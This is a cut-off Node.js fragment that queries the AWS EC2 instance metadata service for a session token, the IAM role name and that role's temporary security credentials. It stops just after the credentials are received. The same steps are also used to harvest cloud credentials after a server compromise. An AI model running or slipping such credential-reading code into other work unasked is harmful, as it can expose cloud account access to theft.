const req1 = http.request("http://169.254.169.254/latest/api/token", {
  "method": "PUT",
  "headers": {
      'X-aws-ec2-metadata-token-ttl-seconds': 5
  }},(res1)=>{
      res1.on("data",(token)=>{
          //process.stdout.write(token);
          const req2 = http.get("http://169.254.169.254/latest/meta-data/iam/security-credentials",{
              "headers": {
                  'X-aws-ec2-metadata-token': token
                }
          }, (res2)=>{
              res2.on("data",(iamRole)=>{
                  //process.stdout.write(iamRole);
                  const req3 = http.get(`http://169.254.169.254/latest/meta-data/iam/security-credentials/${iamRole}`,{
                      "headers": {
                          'X-aws-ec2-metadata-token': token
                        }
                  }, (res3)=>{
                      res3.on("data",(credentials)=>{
                          //process.stdout.write(credentials);

                          
                          aws_c...